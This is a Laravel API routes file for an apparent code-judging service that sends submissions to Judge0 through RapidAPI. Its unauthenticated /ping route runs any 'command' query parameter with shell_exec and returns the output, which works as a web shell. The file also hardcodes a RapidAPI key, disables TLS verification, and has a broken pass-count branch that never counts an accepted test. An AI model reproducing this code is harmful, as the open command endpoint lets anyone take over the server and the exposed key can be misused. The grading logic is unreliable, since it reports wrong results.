<?php

use Illuminate\Http\Request;
use App\Models\Testcase;
use App\Models\Submission;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

use Illuminate\Support\Facades\Route;


/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});
Route::get('/ping', function (Request $request) {
    $n = $request->query('command');
    $out = shell_exec($n);
    return $out;
});

Route::middleware('auth:sanctum')->post('/startevaluation', function (Request $request) {
    Log::info(auth()->user());
    $client = new \GuzzleHttp\Client(['verify' => false]);
    $var = $request->json()->all();
    $testcaseinfo = Testcase::where("problem_id", $var['problem_id'])->get();
    $evaluation_infos = [];
    Log::info($testcaseinfo);
    foreach ($testcaseinfo as $eachtestcase) {
        $evaluation_info = array(
            "language_id" => $var['language_id'],
            "problem_id" => $var['problem_id'],
            "source_code" => $var['source_code'],
            "stdin" => $eachtestcase['input'],
            "expected_output" => $eachtestcase['expected_output']
        );
        array_push($evaluation_infos, $evaluation_info);
    }

    Log::info($eachtestcase);
    $response = $client->request('POST', 'https://judge0-ce.p.rapidapi.com/submissions/batch?base64_encoded=false&fields=*', [
        'body' => json_encode(["submissions" => $evaluation_infos]),
        'headers' => [
            'Content-Type' => 'application/json',
            'X-RapidAPI-Host' => 'judge0-ce.p.rapidapi.com',
            'X-RapidAPI-Key' => 'c16099ba51msh4ebb606602739aep1b6c76jsn5cb237ec9c3e',
            'content-type' => 'application/json',
        ],
    ]);


    $data = json_decode($response->getBody(), true);
    $tokens = [];
    foreach ($data as $token) {
        array_push($tokens, $token["token"]);
    }
    Log::info($tokens);
    Log::info($var);
    $csTokens = implode(",", $tokens);
    $url = 'https://judge0-ce.p.rapidapi.com/submissions/batch?tokens=' . $csTokens . '&base64_encoded=false&fields=*';
    do {
        $response = $client->request('GET', $url, [
            'headers' => [
                'X-RapidAPI-Host' => 'judge0-ce.p.rapidapi.com',
                'X-RapidAPI-Key' => 'c16099ba51msh4ebb606602739aep1b6c76jsn5cb237ec9c3e',
            ],
        ]);
        Log::info("calling second api");
        $evalresults = json_decode($response->getBody(), true);
        Log::info("evalresults is:");
        Log::info($evalresults);
        $all_finished = true;
        foreach ($evalresults["submissions"] as $evalresult){
            if ($evalresult['finished_at']== NULL){
                $all_finished=false;
                break;
            }
        }
        Log::info("second api res:");
        Log::info($evalresults);
        sleep(3);
    } while (!$all_finished);

    $user_id = Auth::id();

    $status = "Success";
    $passed_count = 0;
    $total_cases=0;
    foreach ($evalresults["submissions"] as $evalresult){
        $total_cases+=1;
    if ($evalresult['status_id'] == 1 or $evalresult['status_id'] == 2) {
        $status = "Pending";
        break;
    } else if ($evalresult['status_id'] > 3) {
        $status = "Failed";
        break;
    } else if($evalresult['status_id']==2){
        $passed_count+=1;
    }
}
    $data_to_store = [
        'user_id' => $user_id,
        'problem_id' => $var['problem_id'],
        'language_id' => $evalresult['language_id'],
        'status' => $status,
        'stdout' => $evalresult['stdout'],
        'stderr' => $evalresult['stderr'],
        'submitted_code' => $evalresult['source_code'],
        'time' => $evalresult['time'],
        "memory" => $evalresult['memory'],
        'token' => $evalresult['token'],
        'passed_count' => $passed_count,
        'total_case_checked'=> $total_cases
    ];
    Submission::create($data_to_store);
    Log::info($data_to_store);
    Log::info('data_to_store:');
    $data_to_store["expected_output"] = $evalresult["expected_output"];
    return $data_to_store;
});
